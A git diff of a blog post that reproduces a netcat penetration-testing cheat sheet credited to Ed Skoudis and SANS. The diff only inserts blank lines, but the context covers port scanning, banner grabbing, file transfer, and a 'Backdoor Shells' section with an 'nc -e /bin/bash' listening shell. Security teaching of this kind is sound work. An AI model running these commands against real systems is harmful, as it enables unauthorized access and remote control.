@@ -9,6 +9,7 @@ categories: netcat, pentest
 All credit for putting together this cheat sheet goes to Ed Skoudis and [SANS][sans-link]
 
 ### Fundamentals
+
 #### Netcat client
 {% highlight bash %}
 nc [TargetIPaddr] [port]
@@ -24,6 +25,7 @@ Create a Netcat listener on arbitrary local port [LocalPort]
 ---
 
 ### File Transfer
+
 #### Push a file from client to listener
 {% highlight bash %}
 nc -l -p [LocalPort] > [outfile]
@@ -49,6 +51,7 @@ Connect to [TargetIPaddr] on [port] and retrieve [outfile]
 ---
 
 ### TCP Port Scanner
+
 #### Port scan an IP Address
 {% highlight bash %}
 nc -v -n -z -w1 [TargetIPaddr] [start_port]-[end_port]
@@ -62,6 +65,7 @@ The randomized ports (-r) switch can be used to choose port numbers randomly in 
 ---
 
 ### TCP Banner Grabber
+
 #### Grab the banner of TCP services running on an IP address from Linux
 {% highlight bash %}
 echo "" | nc -v -n -w1 [TargetIPaddr] [start_port]-[end_port]
@@ -78,6 +82,7 @@ Add -p [port] to specify a source port
 ---
 
 ### Backdoor Shells
+
 #### Listening backdoor shell on Linux
 {% highlight bash %}
 nc -l -p [LocalPort] -e /bin/bash
